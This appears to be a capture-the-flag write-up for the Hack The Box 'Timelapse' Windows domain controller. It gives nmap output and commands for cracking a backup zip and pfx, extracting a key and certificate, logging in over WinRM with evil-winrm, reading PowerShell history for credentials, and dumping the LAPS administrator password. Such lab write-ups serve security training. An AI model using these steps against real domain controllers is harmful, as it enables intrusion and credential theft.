# Timelapse

## NMAP

```text
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 127
88/tcp    open  kerberos-sec   syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
389/tcp   open  ldap           syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
464/tcp   open  kpasswd5       syn-ack ttl 127
593/tcp   open  http-rpc-epmap syn-ack ttl 127
636/tcp   open  ldapssl        syn-ack ttl 127
5986/tcp  open  wsmans         syn-ack ttl 127
9389/tcp  open  adws           syn-ack ttl 127
49667/tcp open  unknown        syn-ack ttl 127
49673/tcp open  unknown        syn-ack ttl 127
49674/tcp open  unknown        syn-ack ttl 127
49693/tcp open  unknown        syn-ack ttl 127
63059/tcp open  unknown        syn-ack ttl 127

PORT     STATE    SERVICE           REASON          VERSION
53/tcp   open     domain            syn-ack ttl 127 Simple DNS Plus
88/tcp   open     kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-06 00:18:43Z)
135/tcp  open     msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open     netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open     ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?     syn-ack ttl 127
593/tcp  open     ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open     ldapssl?          syn-ack ttl 127
3268/tcp open     ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open     globalcatLDAPssl? syn-ack ttl 127
5985/tcp filtered wsman             no-response
9389/tcp open     mc-nmf            syn-ack ttl 127 .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## FQDN

```text
timelapse.htb
dc1.timelapse.htb
```

## Listing Shares

![TimeLapse-shares](/HTB/Machines/images/TimeLapse-smbclient.png)

## Shares Content

![TimeLapse-share-content](/HTB/Machines/images/TimeLapse-Shares-share.png)

![TimeLapse-discover-laps](/HTB/Machines/images/TimeLapse-discover-laps.png)

## Zip Cracking

```bash
zip2john winrm_backup.zip > zip.hash

john --format=PKZIP --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

![TimeLapse-Zip-cracked](/HTB/Machines/images/TimeLapse-brute-wirmzip.png)

## PKCS cracking

```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
```

![TimeLapse-Pfx-cracked](/HTB/Machines/images/TimeLapse-brute-pfx.png)

## PFX extract key and cert

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```

![TimeLapse-pfx-get-key-cert](/HTB/Machines/images/TimeLapse-get-key-cert.png)

## evil-winrm connect with key and certificate

```bash
evil-winrm -i $IP -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

## Powershell readline history

```pwsh
cd C:\Users\legaccy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
type ConsoleHost_history.txt
```

![TimeLapse-PS-history](/HTB/Machines/images/TimeLapse-PS-history.png)

## LAPS

```bash
evil-winrm -i $IP -u svc-deploy -p <passwd>
```

```pwsh
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

![laps-dump-admin-pwd](/HTB/Machines/images/TimeLapse-laps-dump-admin-pwd.png)

### references

[oxdf-powershell-history](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html)
